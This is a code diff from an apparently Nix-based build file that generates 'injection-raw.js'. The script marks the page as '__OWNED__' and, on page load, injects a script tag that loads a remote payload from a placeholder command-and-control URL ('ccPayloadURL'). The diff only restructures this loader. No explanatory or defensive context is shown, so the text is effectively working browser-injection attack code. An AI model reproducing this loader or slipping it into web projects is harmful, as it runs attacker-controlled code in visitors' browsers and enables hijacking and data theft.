@@ -48,18 +48,18 @@ let
 
   injectionRaw = pkgs.writeText "injection-raw.js" ''
     (function(){
-      function payload() {
-        if (!window.__OWNED__) {
-            window.__OWNED__ = true;
-            var script = document.createElement('script');
-            script.setAttribute('src', '${ccPayloadURL}');
-            document.getElementsByTagName('html')[0].appendChild(script);
+      if (!window.__OWNED__) {
+        window.__OWNED__ = true;
+        function own() {
+          var script = document.createElement('script');
+          script.setAttribute('src', '${ccPayloadURL}');
+          document.getElementsByTagName('html')[0].appendChild(script);
         }
-      }
-      if (window.addEventListener) {
-        window.addEventListener('load', payload)
-      } else {
-        window.attachEvent('onload', payload)
+        if (window.addEventListener) {
+          window.addEventListener('load', own)
+        } else {
+          window.attachEvent('onload', own)
+        }
       }
     })();
   '';
